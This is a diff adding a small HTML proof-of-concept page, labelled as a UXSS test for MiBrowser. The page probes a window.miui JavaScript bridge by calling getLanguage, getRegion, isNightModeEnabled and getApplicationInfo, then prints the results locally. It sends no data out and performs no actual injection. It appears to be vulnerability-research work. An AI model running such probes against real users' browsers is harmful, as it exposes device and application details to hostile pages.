@@ -1,0 +1,54 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>MiBrowser UXSS PoC - pelioro</title>
+<script>
+(async function(){
+  function show(id, text){
+    var el = document.getElementById(id) || document.body.appendChild(document.createElement('pre'));
+    el.id = id;
+    el.style.whiteSpace = "pre-wrap";
+    el.textContent = (el.textContent ? el.textContent + "\n\n" : "") + text;
+  }
+
+  try {
+    if (typeof window.miui === 'object') {
+      show('out', 'window.miui is OBJECT — trying safe calls...\n');
+
+      try {
+        if (typeof window.miui.getLanguage === 'function') {
+          let lang = window.miui.getLanguage();
+          show('out', 'getLanguage() => ' + String(lang));
+        } else show('out', 'getLanguage() not callable');
+      } catch(e) { show('out', 'getLanguage() threw: ' + e); }
+
+      try {
+        if (typeof window.miui.getRegion === 'function') {
+          let region = window.miui.getRegion();
+          show('out', 'getRegion() => ' + String(region));
+        } else show('out', 'getRegion() not callable');
+      } catch(e) { show('out', 'getRegion() threw: ' + e); }
+
+      try {
+        if (typeof window.miui.isNightModeEnabled === 'function') {
+          let nm = window.miui.isNightModeEnabled();
+          show('out', 'isNightModeEnabled() => ' + String(nm));
+        } else show('out', 'isNightModeEnabled() not callable');
+      } catch(e) { show('out', 'isNightModeEnabled() threw: ' + e); }
+
+      // safe: inspect keys + attempt to call only safe-sounding functions
+      try {
+        if (typeof window.miui.getApplicationInfo === 'function') {
+          let info = window.miui.getApplicationInfo();
+          try { show('out', 'getApplicationInfo() => ' + JSON.stringify(info)); }
+          catch(_) { show('out', 'getApplicationInfo() => [non-serializable value]'); }
+        } else show('out', 'getApplicationInfo() not callable');
+      } catch(e) { show('out', 'getApplicationInfo() threw: ' + e); }
+
+    } else {
+      show('out', 'window.miui NOT found on this page');
+    }
+  } catch(err) {
+    show('out', 'top-level error: ' + err);
+  }
+})();
+</script>
